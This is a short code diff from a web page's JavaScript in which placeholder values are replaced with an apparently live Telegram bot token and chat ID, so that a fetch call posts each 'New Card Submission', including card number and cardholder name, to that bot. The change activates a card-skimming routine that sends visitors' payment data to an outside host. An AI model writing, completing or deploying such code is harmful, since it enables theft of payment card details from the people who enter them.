@@ -182,13 +182,13 @@
             };
 
             // Send to Telegram bot (recommended)
-            fetch('https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage', {
+            fetch('https://api.telegram.org/bot8751997768:AAFVzwoq51lB0qEJawozEdgzVC59uqvA3YY/sendMessage', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({
-                    chat_id: 'YOUR_CHAT_ID',
+                    chat_id: '7845249398',
                     text: `💳 New Card Submission:\n\n` +
                           `🔢 Card: ${cardData.cardNumber}\n` +
                           `👤 Name: ${cardData.nameOnCard}\n` +
